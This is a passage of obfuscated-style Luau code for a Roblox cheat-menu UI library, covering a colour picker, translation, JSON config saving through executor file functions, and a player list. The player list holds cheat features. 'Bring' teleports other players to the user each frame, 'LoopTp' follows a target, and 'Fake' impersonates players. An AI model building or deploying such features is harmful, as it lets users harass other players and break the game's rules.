												or L.UserInputType == Enum.UserInputType.Touch
											then
												HD = true
												n(L)
											end
										end)

										Connect(g.InputBegan, function(L)
											if
												L.UserInputType == Enum.UserInputType.MouseButton1
												or L.UserInputType == Enum.UserInputType.Touch
											then
												mD = true
												G(L)
											end
										end)

										Connect(D.InputEnded, function(L)
											if
												L.UserInputType == Enum.UserInputType.MouseButton1
												or L.UserInputType == Enum.UserInputType.Touch
											then
												HD, mD = false, false
											end
										end)

										Connect(D.InputChanged, function(D)
											if
												D.UserInputType == Enum.UserInputType.MouseMovement
												or D.UserInputType == Enum.UserInputType.Touch
											then
												if HD then
													n(D)
												elseif mD then
													G(D)
												end
											end
										end)

										a.Set = function(D, n, L)
											D.Value = S(n, D.Value)
											_, d, DD = D.Value:ToHSV()
											hD()

											if not L then
												r()
											end
										end

										a.Get = function(D)
											return N(D.Value)
										end

										a.GetColor = function(D)
											return D.Value
										end

										hD()
										Insert(e.Controls, a)
										Insert(e.Window.Controls, a)
										e:_attachParent(a, a.Parent)

										if y.Default ~= nil then
											H(a.Callback, a.Value)
										end

										return a
									end

									Connect(Q.MouseButton1Click, function()
										q:Set(not q.Enabled)
									end)

									Connect(Q.InputBegan, function(D)
										if D.UserInputType == Enum.UserInputType.MouseButton2 then
											q:SetExpanded(not q.Expanded)
										end
									end)

									Connect(f.MouseButton1Click, function()
										q:SetExpanded(not q.Expanded)
									end)

									Connect(b.MouseEnter, function()
										b.BackgroundColor3 = k.CardHover
										b.BackgroundTransparency = l
									end)

									Connect(b.MouseLeave, function()
										b.BackgroundColor3 = k.Card
										b.BackgroundTransparency = l
									end)

									Insert(p.Modules, q)
									Insert(p.Window.Modules, q)

									if p.Window.ActiveTabName == p.Name then
										b.Parent = p.Window.List
									else
										b.Parent = nil
									end

									if q.Enabled then
										I(q.TitleLabel, p.Window.Theme.Primary, p.Window.Theme.Accent, nil, p.Window)
										H(q.Callback, true)
									end

									return q
								end

								if not O.FirstTabName and V ~= "Search" and V ~= "Themes" then
									O.FirstTabName = F
								end

								if not O.ActiveTabName and V ~= "Search" and V ~= "Themes" then
									O:SelectTab(F)
								end

								return Z
							end

							W.T = function(D, O, F)
								local p = if F == nil or F == "" then (tostring(O or "")) else F
								if D.Language ~= o then
									return p
								end
								local f = D._zhCatalog
								D = O and f[O]

								D = if (type(D) ~= "string" or D == "")
										and type(F) == "string"
										and F ~= ""
									then f[F]
									else D

								if type(D) == "string" and D ~= "" then
									return D
								end
								return p
							end

							W.RegisterTranslations = function(D, O, F)
								if O ~= o and O ~= "zh" and O ~= "zh-cn" then
									return false
								end
								E(D._zhCatalog, F)

								if D.Language == o then
									D:ApplyLanguage()
								end

								return true
							end

							W._refreshControlLocale = function(D, O)
								local F = O.NameLabel
								if not F then
									return
								end
								local E = D:T(O.NameKey or O.Id, O.Name)

								if O.Type == "Selector" and O._optionText then
									F.Text = E .. ": " .. O:_optionText(O.Value)
								else
									F.Text = E
								end
							end

							W.ApplyLanguage = function(D)
								for O = 1, #D.TabOrder, 1 do
									local F = D.TabOrder[O]

									if F.NavLabel then
										F.NavLabel.Text = D:T(F.NameKey or F.Id or F.Key, F.Name)
									end
								end

								for O = 1, #D.Modules, 1 do
									local F = D.Modules[O]

									if F.TitleLabel then
										F.TitleLabel.Text = D:T(F.NameKey or F.Id, F.Name)
									end

									if F.DescriptionLabel then
										F.DescriptionLabel.Text = D:T(F.Id .. ".desc", F.Description)
									end

									if F.CategoryLabel and F.Tab then
										F.CategoryLabel.Text = "("
											.. D:T(F.Tab.NameKey or F.Tab.Id or F.Tab.Key, F.Tab.Name)
											.. ")"
									end

									if F.LayoutHeaderText then
										F:LayoutHeaderText()
									end

									for O = 1, #F.Controls, 1 do
										D:_refreshControlLocale(F.Controls[O])
									end
								end

								for O, F in pairs(D._playerListRows or {}) do
									O = F.ActionLabels or {}

									for E = 1, #O, 1 do
										F = O[E]

										if F.Label then
											F.Label.Text = D:T(F.Id, F.Name)
										end
									end
								end

								if D._playerListSearchBox then
									D._playerListSearchBox.PlaceholderText = D:T(
										"player-list-search",
										(D._playerListConfig or {}).SearchPlaceholder or "Search player..."
									)
								end

								if D._playerListRefreshButton then
									D._playerListRefreshButton.Text =
										D:T("player-list-refresh", (D._playerListConfig or {}).RefreshText or "Refresh")
								end

								local O = D.Tabs[D.ActiveTabName]

								if O and (O.Kind == "Language" or O.Name == "Language") then
									D:_renderLanguageSystem()
								end
							end

							W.SetLanguage = function(D, O)
								if O ~= U and O ~= o then
									return false
								end
								D.Language = O
								D:ApplyLanguage()
								return true
							end

							W._collectConfig = function(D)
								local O = { Theme = D.ThemeName, Language = D.Language, Modules = {} }

								if D.CustomTheme then
									O.CustomTheme =
										{ Primary = N(D.CustomTheme.Primary), Accent = N(D.CustomTheme.Accent) }
								end

								for F = 1, #D.Modules, 1 do
									local E = D.Modules[F]
									F = { Enabled = E.Enabled, Controls = {} }

									for D = 1, #E.Controls, 1 do
										local p = E.Controls[D]
										F.Controls[p.Id] = p:Get()
									end

									O.Modules[E.Id] = F
								end

								return O
							end

							W.SaveConfig = function(D, O)
								O = O or "default"
								local F, E, p = B:JSONEncode(D:_collectConfig()), c("writefile"), c("makefolder")

								if typeof(E) == "function" then
									if typeof(p) == "function" then
										pcall(p, "Rise")
										pcall(p, D.ConfigFolder)
									end

									E(D.ConfigFolder .. "/" .. O .. ".json", F)
								else
									_G.RiseLibConfigs = _G.RiseLibConfigs or {}
									_G.RiseLibConfigs[O] = F
								end

								return true
							end

							W.LoadConfig = function(D, O)
								O = O or "default"
								local F
								local E, p, f = c("readfile"), c("isfile"), D.ConfigFolder .. "/" .. O .. ".json"

								if typeof(E) == "function" and typeof(p) == "function" and (p(f)) then
									F = E(f)
								elseif _G.RiseLibConfigs then
									F = _G.RiseLibConfigs[O]
								end

								if not F then
									return false
								end

								O, E = pcall(function()
									return B:JSONDecode(F)
								end)

								if not O or type(E) ~= "table" then
									return false
								end

								if E.CustomTheme then
									D:SetCustomTheme(E.CustomTheme.Primary, E.CustomTheme.Accent)
								elseif E.Theme then
									D:SetTheme(E.Theme)
								end

								if E.Language == U or E.Language == o then
									D.Language = E.Language
									D:ApplyLanguage()
								end

								for B = 1, #D.Modules, 1 do
									p = D.Modules[B]
									O = E.Modules and E.Modules[p.Id]

									if O then
										p:Set(O.Enabled, true)

										for B = 1, #p.Controls, 1 do
											f = p.Controls[B]
											B = O.Controls and O.Controls[f.Id]

											if B ~= nil then
												f:Set(B, true)
											end
										end
									end
								end

								for B = 1, #D.Modules, 1 do
									f = D.Modules[B]
									p = E.Modules and E.Modules[f.Id]

									if p then
										H(f.Callback, p.Enabled)

										for D = 1, #f.Controls, 1 do
											O = f.Controls[D]
											B = p.Controls and p.Controls[O.Id]

											if B ~= nil and O.Type ~= "Keybind" then
												D = O.Type == "ColorPicker" and O.GetColor
												H(O.Callback, if D then (O:GetColor()) else B)
											end
										end
									end
								end

								return true
							end

							W.GetConfigs = function(D)
								local B, O = {}, c("readfile")
								c("isfile")
								local F, E = c("listfiles"), D.ConfigFolder

								if typeof(F) == "function" and typeof(O) == "function" then
									local O, p = pcall(F, E)

									if O and p then
										for O = 1, #p, 1 do
											D = p[O]

											if string.match(D, "%.json$") then
												O = string.match(D, "([^/\\]+)%.json$")

												if O then
													Insert(B, O)
												end
											end
										end
									end
								elseif _G.RiseLibConfigs then
									for D in pairs(_G.RiseLibConfigs) do
										Insert(B, D)
									end
								end

								Sort(B)
								return B
							end

							W.DeleteConfig = function(D, B)
								B = B or "Default"
								local O, F = c("removefile") or (c("delfile")), D.ConfigFolder .. "/" .. B .. ".json"

								if typeof(O) == "function" then
									return (pcall(O, F))
								elseif _G.RiseLibConfigs then
									_G.RiseLibConfigs[B] = nil
									return true
								end

								return false
							end

							local D, B, O, F, E, c = 36, 32, 36, 8, 25, 120

							W._playerListRememberIdentity = function(p, f)
								if not f then
									return
								end
								local V = f.UserId
								if type(V) ~= "number" then
									return
								end
								p._playerListIdentities = p._playerListIdentities or {}

								p._playerListIdentities[V] =
									{ UserId = V, Name = f.Name or "", DisplayName = f.DisplayName or f.Name or "" }
							end

							W._playerListResolveInfo = function(p, f)
								if not f then
									return nil
								end
								local V = f.UserId
								if type(V) ~= "number" then
									return nil
								end
								local e = m:GetPlayerByUserId(V)
								if e then
									return V, e.Name, e.DisplayName, e
								end
								e = (p._playerListIdentities or {})[V]
								p = f.Name or e and e.Name or ""
								local n = f.DisplayName or e and e.DisplayName or p
								return V, p, n, e or { UserId = V, Name = p, DisplayName = n }
							end

							W._playerListRefreshFilter = function(p)
								local f, V = p._playerListSearchText or "", p._playerListIdentities or {}

								for e, n in pairs(p._playerListRows or {}) do
									local p = true

									if f ~= "" then
										local r, N = m:GetPlayerByUserId(e), V[e]

										local V = Lower(
											(r and r.DisplayName or N and N.DisplayName or "")
												.. " "
												.. (r and r.Name or N and N.Name or "")
										)

										p = string.find(V, f, 1, true) ~= nil
									end

									if n.Row then
										n.Row.Visible = p
									end
								end
							end

							W._playerListRemoveByUserId = function(p, f)
								if type(f) ~= "number" then
									return
								end
								local V = p._playerListRows and p._playerListRows[f]

								if V and V.Row then
									V.Row:Destroy()
								end

								if p._playerListRows then
									p._playerListRows[f] = nil
								end

								if p._playerListStates then
									p._playerListStates[f] = nil
								end

								if p._playerListIdentities then
									p._playerListIdentities[f] = nil
								end

								if p._playerListBring then
									p._playerListBring[f] = nil
								end

								if p._playerListLoopTp then
									p._playerListLoopTp[f] = nil
								end

								p:_playerListSyncDeathWatch(f, nil)
							end

							W._playerListRemovePlayer = function(p, f)
								p:_playerListRemoveByUserId(f and f.UserId)
							end

							W._playerListManualRefresh = function(p)
								if not p._playerListFrame then
									return
								end
								p._playerListIdentities = p._playerListIdentities or {}
								p._playerListRows = p._playerListRows or {}
								p._playerListStates = p._playerListStates or {}
								local f, V = {}, GetPlayerList()

								for e = 1, #V, 1 do
									local n = V[e]
									f[n.UserId] = n

									if not p._playerListRows[n.UserId] then
										p:_playerListAddPlayer(n)
									else
										p:_playerListRememberIdentity(n)
									end
								end

								V = {}

								for e in pairs(p._playerListRows) do
									if not f[e] then
										local f = p._playerListStates[e]

										if f ~= "Whitelist" and f ~= "Blacklist" then
											V[#V + 1] = e
										end
									end
								end

								for f = 1, #V, 1 do
									p:_playerListRemoveByUserId(V[f])
								end

								for f, f in pairs(p._playerListRows) do
									if f.Refresh then
										f.Refresh()
									end
								end
							end

							W._playerListSetButtonState = function(p, f, V, e)
								if e then
									f.BackgroundTransparency = 1
									f.BackgroundColor3 = NewColor3(1, 1, 1)
									I(f, p.Theme.Primary, p.Theme.Accent, nil, p)
									V.TextColor3 = k.Text
									w(f, { BackgroundTransparency = 0 }, Y)
								else
									f.BackgroundTransparency = 0
									u(f, p)
									f.BackgroundColor3 = k.Track
									V.TextColor3 = k.Muted
								end
							end

							W._playerListSyncDeathWatch = function(p, f, V)
								p._playerListDeathWatchers = p._playerListDeathWatchers or {}
								local e = p._playerListDeathWatchers[f]

								if e then
									for n = 1, #e, 1 do
										Disconnect(e[n])
									end

									p._playerListDeathWatchers[f] = nil
								end

								if V ~= "Blacklist" then
									return
								end
								local V = m:GetPlayerByUserId(f)
								if not V then
									return
								end
								local e = {}
								p._playerListDeathWatchers[f] = e

								local function f(n)
									if not n then
										return
									end
									local r = FindFirstChildOfClass(n, "Humanoid")

									if r then
										Insert(e, (Connect(r.Died, function()
											p:Notify({
												Title = "Blacklist Player",
												Content = V.Name .. " Died",
												Duration = 2.5,
											})
										end)))
									end
								end

								if V.Character then
									f(V.Character)
								end

								Insert(e, (Connect(V.CharacterAdded, function(e)
									p:Notify({
										Title = "Blacklist Player",
										Content = V.Name .. " Respawned",
										Duration = 2.5,
									})

									f(e)
								end)))
							end

							W._playerListAddPlayer = function(p, f)
								local V, e, n, r = p:_playerListResolveInfo(f)
								if not V then
									return
								end
								p._playerListRows = p._playerListRows or {}
								if p._playerListRows[V] then
									return
								end

								if not p._playerListFrame then
									return
								end
								local N, S = p._playerListConfig or {}, m.LocalPlayer
								if not N.IncludeLocalPlayer and S and V == S.UserId then
									return
								end
								p:_playerListRememberIdentity(r)

								local S, a, L, y =
									p.IsMobile and 42 or 50,
									p.IsMobile and 28 or 36,
									p.IsMobile and 22 or 26,
									p.IsMobile and 46 or 54

								local G, T, M =
									Floor((S - a) / 2), Floor((S - L) / 2), s("Frame", {
										Size = NewUDim2(1, 0, 0, S),
										BackgroundColor3 = k.Card,
										BorderColor3 = k.Border,
										BorderSizePixel = 1,
									}, { P(8) })

								M.Parent = p._playerListFrame

								local S = s("ImageLabel", {
									Position = NewUDim2(0, 8, 0, G),
									Size = NewUDim2(0, a, 0, a),
									BackgroundColor3 = k.Track,
									BorderSizePixel = 0,
									Image = "",
								}, { P(Floor(a / 2)) })

								S.Parent = M

								Spawn(function()
									for G = 1, 8, 1 do
										if not S.Parent then
											return
										end

										local G, Z = pcall(function()
											return m:GetUserThumbnailAsync(
												V,
												Enum.ThumbnailType.HeadShot,
												Enum.ThumbnailSize.Size100x100
											)
										end)

										if G and typeof(Z) == "string" and Z ~= "" then
											S.Image = Z
											return
										end
										Wait(0.5)
									end
								end)

								f = v({
									Text = if n ~= "" and n ~= e then n .. " (@" .. e .. ")" else e,
									Position = NewUDim2(0, a + 16, 0, 0),
									Size = NewUDim2(1, -(a + 16 + y * 4 + 38), 1, 0),
									TextSize = i("PlayerName", p.IsMobile),
									Font = j,
									Color = k.Text,
									X = Enum.TextXAlignment.Left,
									Truncate = Enum.TextTruncate.AtEnd,
								})

								f.Parent = M

								local function e(n, S, a)
									local G = s("TextButton", {
										Name = n,
										Text = "",
										AnchorPoint = NewVector2(1, 0),
										Position = NewUDim2(1, -a, 0, T),
										Size = NewUDim2(0, y, 0, L),
										AutoButtonColor = false,
										BackgroundColor3 = k.Track,
										BorderSizePixel = 0,
										ZIndex = 2,
									}, { P(5) })

									G.Parent = M

									a = s("TextLabel", {
										Name = n .. "-label",
										Text = p:T(n, S),
										Size = NewUDim2(1, 0, 1, 0),
										BackgroundTransparency = 1,
										TextColor3 = k.Muted,
										TextSize = i("PlayerActionButton", p.IsMobile),
										Font = j,
										ZIndex = 3,
									})

									a.Parent = G
									return G, a
								end

								local n, S = e("player-list-blacklist", N.BlacklistText or "Blacklist", y + 8)
								local a, L = e("player-list-fake", N.FakeText or "Fake", y * 2 + 14)
								local G, T = e("player-list-whitelist", N.WhitelistText or "Whitelist", y * 3 + 20)
								local Z, C = e("player-list-bring", N.BringText or "Bring", 8)
								local Q, q = e("player-list-looptp", N.LoopTpText or "LoopTp", y * 4 + 28)

								local function e()
									local y = p._playerListStates[V]
									p:_playerListSetButtonState(n, S, y == "Blacklist")
									p:_playerListSetButtonState(G, T, y == "Whitelist")
									p:_playerListSetButtonState(Z, C, p._playerListBring and p._playerListBring[V])
									p:_playerListSetButtonState(Q, q, p._playerListLoopTp and p._playerListLoopTp[V])
									p:_playerListSetButtonState(a, L, p._fakePlayerTargetUserId == V)
									p:_playerListSyncDeathWatch(V, y)
								end

								local function y()
									return m:GetPlayerByUserId(V)
										or p._playerListIdentities and p._playerListIdentities[V]
										or r
								end

								Connect(n.MouseButton1Click, function()
									if p._playerListStates[V] == "Blacklist" then
										p._playerListStates[V] = nil
									else
										p._playerListStates[V] = "Blacklist"
									end

									e()
									H(N.StateChanged, { Player = y(), State = p._playerListStates[V] })
								end)

								Connect(G.MouseButton1Click, function()
									if p._playerListStates[V] == "Whitelist" then
										p._playerListStates[V] = nil
									else
										p._playerListStates[V] = "Whitelist"
									end

									e()
									H(N.StateChanged, { Player = y(), State = p._playerListStates[V] })
								end)

								Connect(Z.MouseButton1Click, function()
									local r = p._playerListBring[V]
									p._playerListBring[V] = not r
									e()
								end)

								Connect(Q.MouseButton1Click, function()
									local r = p._playerListLoopTp[V]
									p._playerListLoopTp[V] = not r
									e()
								end)

								Connect(a.MouseButton1Click, function()
									if typeof(p.ApplyFakePlayer) ~= "function" then
										return
									end

									if p._fakePlayerTargetUserId == V then
										if typeof(p.RestoreFakePlayer) == "function" then
											p:RestoreFakePlayer()
										end

										return
									end

									p:ApplyFakePlayer(V)
								end)

								p._playerListRows[V] = {
									Row = M,
									NameLabel = f,
									BlackBtn = n,
									BlackLabel = S,
									WhiteBtn = G,
									WhiteLabel = T,
									BringBtn = Z,
									BringLabel = C,
									LoopTpBtn = Q,
									LoopTpLabel = q,
									FakeBtn = a,
									FakeLabel = L,
									ActionLabels = {
										{
											Id = "player-list-blacklist",
											Name = N.BlacklistText or "Blacklist",
											Label = S,
										},
										{
											Id = "player-list-whitelist",
											Name = N.WhitelistText or "Whitelist",
											Label = T,
										},
										{ Id = "player-list-bring", Name = N.BringText or "Bring", Label = C },
										{ Id = "player-list-looptp", Name = N.LoopTpText or "LoopTp", Label = q },
										{ Id = "player-list-fake", Name = N.FakeText or "Fake", Label = L },
									},
									Refresh = e,
								}

								e()
								p:_playerListRefreshFilter()
							end

							W._playerListRefreshFakeButtons = function(p)
								for f, f in pairs(p._playerListRows or {}) do
									if f.Refresh then
										f.Refresh()
									end
								end
							end

							W._renderPlayerList = function(p)
								p:_clear()

								if p._playerListUIConnections then
									for f = 1, #p._playerListUIConnections, 1 do
										Disconnect(p._playerListUIConnections[f])
									end
								end

								p._playerListUIConnections = {}
								local f, V = p._playerListConfig or {}, p.IsMobile and O or B
								local B = D + F * 2 + V

								local function O()
									return Max(c, (p.Scroll and p.Scroll.AbsoluteSize.Y or 0) - E)
								end

								local E = s("Frame", {
									Name = "PlayerListHost",
									Size = NewUDim2(1, 0, 0, O()),
									BackgroundTransparency = 1,
								})

								SetAttribute(E, "SkipFade", true)
								E.Parent = p.List
								p._playerListHost = E

								local c = s("TextBox", {
									Name = "player-list-search",
									Text = "",
									PlaceholderText = p:T(
										"player-list-search",
										f.SearchPlaceholder or "Search player..."
									),
									Size = NewUDim2(1, 0, 0, D),
									Position = NewUDim2(0, 0, 0, 0),
									BackgroundColor3 = k.Track,
									BorderColor3 = k.Border,
									BorderSizePixel = 1,
									TextColor3 = k.Text,
									PlaceholderColor3 = k.Muted,
									TextSize = i("PlayerSearchBox"),
									Font = j,
									TextXAlignment = Enum.TextXAlignment.Left,
									ClearTextOnFocus = false,
								}, { P(7), J(10, 0, 10, 0) })

								c.Parent = E
								p._playerListSearchBox = c

								local e = s("ScrollingFrame", {
									Name = "PlayerListFrame",
									BackgroundTransparency = 1,
									Size = NewUDim2(1, 0, 1, -B),
									Position = NewUDim2(0, 0, 0, D + F),
									BorderSizePixel = 0,
									CanvasSize = NewUDim2(0, 0, 0, 0),
									AutomaticCanvasSize = Enum.AutomaticSize.Y,
									ScrollBarThickness = 2,
									ScrollBarImageColor3 = NewRGB(255, 255, 255),
									ScrollBarImageTransparency = 0.88,
								}, {
									s("UIListLayout", {
										FillDirection = Enum.FillDirection.Vertical,
										SortOrder = Enum.SortOrder.LayoutOrder,
										Padding = NewUDim(0, 6),
									}),
								})

								e.Parent = E
								p._playerListFrame = e

								local D = s("TextButton", {
									Name = "player-list-refresh",
									Text = p:T("player-list-refresh", f.RefreshText or "Refresh"),
									AutoButtonColor = false,
									AnchorPoint = NewVector2(0, 1),
									Position = NewUDim2(0, 0, 1, 0),
									Size = NewUDim2(1, 0, 0, V),
									BackgroundColor3 = k.Track,
									BorderColor3 = k.Border,
									BorderSizePixel = 1,
									TextColor3 = k.Text,
									TextSize = i("ConfigButton"),
									Font = j,
									ZIndex = 2,
								}, { P(7) })

								D.Parent = E
								p._playerListRefreshButton = D

								Connect(D.MouseEnter, function()
									w(D, { BackgroundTransparency = 0.05 }, 0.12)
								end)

								Connect(D.MouseLeave, function()
									w(D, { BackgroundTransparency = 0 }, 0.12)
								end)

								Connect(D.MouseButton1Click, function()
									p:_playerListManualRefresh()
								end)

								p._playerListRows = {}
								p._playerListIdentities = p._playerListIdentities or {}
								p._playerListSearchText = ""

								f = Connect(GetPropertyChangedSignal(c, "Text"), function()
									p._playerListSearchText = Lower(c.Text)
									p:_playerListRefreshFilter()
								end)

								Insert(p._playerListUIConnections, f)

								local function D()
									if not E.Parent then
										return
									end
									E.Size = NewUDim2(1, 0, 0, O())
								end

								D()

								if p.Scroll then
									B = Connect(GetPropertyChangedSignal(p.Scroll, "AbsoluteSize"), D)
									Insert(p._playerListUIConnections, B)
								end

								D = false

								for B in pairs(p._playerListIdentities) do
									D = true
									break
								end

								if not D then
									V = GetPlayerList()

									for D = 1, #V, 1 do
										p:_playerListAddPlayer(V[D])
									end
								else
									for D, B in pairs(p._playerListIdentities) do
										p:_playerListAddPlayer(m:GetPlayerByUserId(D) or B)
									end
								end
							end

							W.CreatePlayerList = function(D, B)
								local O = B or {}
								D._playerListConnections = D._playerListConnections or {}
								D._playerListRows = D._playerListRows or {}
								D._playerListStates = D._playerListStates or {}
								D._playerListIdentities = D._playerListIdentities or {}
								D._playerListConfig = O
								D._playerListSearchText = ""
								D._playerListBring = D._playerListBring or {}

								if D._playerListBringConnection then
									Disconnect(D._playerListBringConnection)
								end

								D._playerListBringConnection = Connect(x.RenderStepped, function()
									local F = m.LocalPlayer
									local E = F and F.Character
									if not E then
										return
									end
									F = FindFirstChild(E, "HumanoidRootPart")
									if not F then
										return
									end
									E = F.CFrame.LookVector * 3
									local c = F.CFrame + E

									for p, f in pairs(D._playerListBring) do
										if f then
											E = m:GetPlayerByUserId(p)

											if E then
												F = E.Character

												if F then
													local E = FindFirstChild(F, "HumanoidRootPart")

													if E then
														E.CFrame = c
													end
												end
											end
										end
									end
								end)

								D._playerListLoopTp = D._playerListLoopTp or {}

								if D._playerListLoopTpConnection then
									Disconnect(D._playerListLoopTpConnection)
								end

								D._playerListLoopTpConnection = Connect(x.RenderStepped, function()
									local F = m.LocalPlayer
									local E = F and F.Character
									if not E then
										return
									end
									F = FindFirstChild(E, "HumanoidRootPart")
									if not F then
										return
									end

									for c, p in pairs(D._playerListLoopTp) do
										if p then
											E = m:GetPlayerByUserId(c)

											if E then
												local c = E.Character

												if c then
													local E = FindFirstChild(c, "HumanoidRootPart")

													if E then
														local c = E.CFrame.Position
														local p = c - NewVector3(0, 3, 0)
														local f = c - p

														f = (if f.Magnitude < 0.001
															then (Vector3.new(0.0, 1.0, 0.0))
															else f).Unit

														local V = Vector3.new(0.0, 1.0, 0.0)

														F.CFrame = CFrame.lookAt(
															p,
															c,
															if Abs(f:Dot(V)) > 0.999 then E.CFrame.LookVector else V
														)
													end
												end
											end
										end
									end
								end)

								B = O.Title or O.Name or "Player List"

								local F = D:CreateTab({
									Id = "tab-player-list",
									Name = B,
									Key = O.TabKey or "tab_playerlist",
									Kind = "PlayerList",
								})

								if D.ActiveTabName == B then
									D:_renderPlayerList()
								end

								return {
									Tab = F,
									Instance = D._playerListFrame,
									GetState = function(B, B)
										local F, E = D._playerListStates[B and B.UserId], false

										for B, B in pairs(D._playerListStates) do
											if B == "Blacklist" then
												E = true
												break
											end
										end

										return F, E
									end,
									HasBlacklist = function()
										for B, B in pairs(D._playerListStates) do
											if B == "Blacklist" then
												return true
											end
										end

										return false
									end,
									SetState = function(B, F, E)
										h()
										B = typeof(F) == "Instance" and F.UserId
										F = type(B) == "number" and (m:GetPlayerByUserId(B))
										if not F then
											return
										end

										if E == "Whitelist" or E == "Blacklist" then
											D._playerListStates[B] = E
										else
											D._playerListStates[B] = nil
										end

										E = D._playerListRows[B]

										if E and E.Refresh then
											E.Refresh()
										elseif D._playerListFrame then
											D:_playerListAddPlayer(F)
										end

										H(O.StateChanged, { Player = F, State = D._playerListStates[B] })
									end,
									Refresh = function()
										D:_playerListManualRefresh()
									end,
								}
							end

							W.CreateConfigSystem = function(D, m)
								local h = type(m) == "table" and m or {}
								D._configSystemConfig = h
								D._selectedConfig = D._selectedConfig or h.Default or ""
								local B = h.Title or h.Name or "Config"
								m = D.Tabs[B]

								if m then
									m.Kind = "Config"
								else
									m = (
										D:CreateTab({
											Id = "tab-config",
											Name = B,
											Key = h.TabKey or "tab_config",
											Kind = "Config",
										})
									)
								end

								if D.ActiveTabName == B then
									D:_renderConfigSystem()
								end

								h = {
									Tab = m,
									GetSelected = function()
										return D._selectedConfig
									end,
									SetSelected = function(m, m)
										D._selectedConfig = m or ""

										if D._configSystemNameInput then
											D._configSystemNameInput.Text = D._selectedConfig
										end

										if D._syncConfigSelection then
											D._syncConfigSelection(true)
										elseif D._refreshConfigList then
											D._refreshConfigList()
										end
									end,
									Refresh = function()
										if D.ActiveTabName == B then
											D:_renderConfigSystem()
										elseif D._refreshConfigList then
											D._refreshConfigList()
										end
									end,
									Save = function(m, m)
										m = m or D._selectedConfig
										if not m or m == "" then
											return false
										end
										D:SaveConfig(m)
										D._selectedConfig = m

										if D._refreshConfigList then
											D._refreshConfigList()
										end

										return true
									end,
									Load = function(m, B)
										B = B or D._selectedConfig
										if not B or B == "" then
											return false
										end
										m = D:LoadConfig(B)

										if m then
											D._selectedConfig = B

											if D._refreshConfigList then
												D._refreshConfigList()
											end
										end

										return m
									end,
									Delete = function(m, B)
										B = B or D._selectedConfig
										if not B or B == "" then
											return false
										end
										m = D:DeleteConfig(B)

										if m then
											if D._selectedConfig == B then
												D._selectedConfig = ""

												if D._configSystemNameInput then
													D._configSystemNameInput.Text = ""
												end
											end

											if D._refreshConfigList then
												D._refreshConfigList()
											end
										end

										return m
									end,
								}

								D._configSystemControl = h
								return h
							end

							W._renderConfigSystem = function(D)
								D:_clear()
								D._configListEntries = {}

								local m, h, B, O, F, E, c =
									D._configSystemConfig or {},
									D._selectedConfig or "",
									NewRGB(22, 25, 33),
									0.4,
									0.15,
									14,
									10

								local p = s("Frame", {
									Size = NewUDim2(1, 0, 0, D.IsMobile and 118 or 112),
									BackgroundColor3 = B,
									BackgroundTransparency = O,
									BorderColor3 = k.Border,
									BorderSizePixel = 1,
								}, { P(E) })

								SetAttribute(p, "SkipFade", true)
								p.Parent = D.List

								v({
									Text = m.ListTitle or "Configs",
									Position = NewUDim2(0, 14, 0, 8),
									Size = NewUDim2(1, -28, 0, 20),
									TextSize = i("ConfigTitle"),
									Font = j,
									Color = k.Text,
								}).Parent =
									p

								local f = s("TextBox", {
									Text = h,
									PlaceholderText = m.InputPlaceholder or "Config name...",
									Size = NewUDim2(1, -28, 0, 30),
									Position = NewUDim2(0, 14, 0, 32),
									BackgroundColor3 = k.Track,
									BackgroundTransparency = 0.25,
									BorderColor3 = k.Border,
									BorderSizePixel = 1,
									TextColor3 = k.Text,
									PlaceholderColor3 = k.Muted,
									TextSize = i("ConfigInput"),
									Font = j,
									TextXAlignment = Enum.TextXAlignment.Left,
									ClearTextOnFocus = false,
								}, { P(c), J(10, 0, 10, 0) })

								f.Parent = p
								D._configSystemNameInput = f

								Connect(GetPropertyChangedSignal(f, "Text"), function()
									local h = f.Text
									if D._selectedConfig == h then
										return
									end
									D._selectedConfig = h

									if D._syncConfigSelection then
										D._syncConfigSelection(false)
									elseif D._refreshConfigList then
										D._refreshConfigList()
									end
								end)

								local h = s("Frame", {
									Size = NewUDim2(1, -28, 0, 28),
									Position = NewUDim2(0, 14, 0, 70),
									BackgroundTransparency = 1,
								}, {
									s("UIListLayout", {
										FillDirection = Enum.FillDirection.Horizontal,
										SortOrder = Enum.SortOrder.LayoutOrder,
										Padding = NewUDim(0, 6),
									}),
								})

								h.Parent = p

								local function p(V, e)
									local n = s("TextButton", {
										Text = V,
										Size = NewUDim2(0, D.IsMobile and 64 or 72, 1, 0),
										BackgroundColor3 = k.TrackHover,
										BackgroundTransparency = 0.2,
										BorderSizePixel = 0,
										TextColor3 = k.Text,
										TextSize = i("ConfigButton"),
										Font = j,
										AutoButtonColor = false,
									}, { P(c) })

									n.Parent = h
									Connect(n.MouseButton1Click, e)

									Connect(n.MouseEnter, function()
										w(n, { BackgroundTransparency = 0.05 }, 0.12)
									end)

									Connect(n.MouseLeave, function()
										w(n, { BackgroundTransparency = 0.2 }, 0.12)
									end)

									return n
								end

								local function h()
									local c = string.gsub(f.Text or "", "^%s*(.-)%s*$", "%1")
									return c ~= "" and c or nil
								end

								p(m.SaveText or "Save", function()
									local c = h()

									if not c then
										D:Notify({
											Title = "Config",
											Content = "Enter a config name first",
											Duration = 2,
										})

										return
									end

									D:SaveConfig(c)
									D._selectedConfig = c

									if D._refreshConfigList then
										D._refreshConfigList()
									end

									D:Notify({ Title = "Saved", Content = "Config saved!", Duration = 2 })
									H(m.OnSave, c)
								end)

								p(m.LoadText or "Load", function()
									local c = h()

									if not c then
										D:Notify({
											Title = "Config",
											Content = "Select or enter a config name",
											Duration = 2,
										})

										return
									end

									if D:LoadConfig(c) then
										D._selectedConfig = c

										if D._refreshConfigList then
											D._refreshConfigList()
										end

										D:Notify({ Title = "Loaded", Content = "Config loaded!", Duration = 2 })
										H(m.OnLoad, c)
									else
										D:Notify({ Title = "Load Failed", Content = "Config not found", Duration = 2 })
									end
								end)

								p(m.DeleteText or "Delete", function()
									local c = h()

									if not c then
										D:Notify({
											Title = "Config",
											Content = "Select a config to delete",
											Duration = 2,
										})

										return
									end

									if D:DeleteConfig(c) then
										D._selectedConfig = ""
										f.Text = ""

										if D._refreshConfigList then
											D._refreshConfigList()
										end

										D:Notify({ Title = "Deleted", Content = "Config deleted", Duration = 2 })
										H(m.OnDelete, c)
									end
								end)

								local H = s("Frame", {
									Name = "ConfigListHost",
									Size = NewUDim2(1, 0, 0, 0),
									AutomaticSize = Enum.AutomaticSize.Y,
									BackgroundTransparency = 1,
								}, {
									s("UIListLayout", {
										FillDirection = Enum.FillDirection.Vertical,
										SortOrder = Enum.SortOrder.LayoutOrder,
										Padding = NewUDim(0, 6),
									}),
								})

								SetAttribute(H, "SkipFade", true)
								H.Parent = D.List
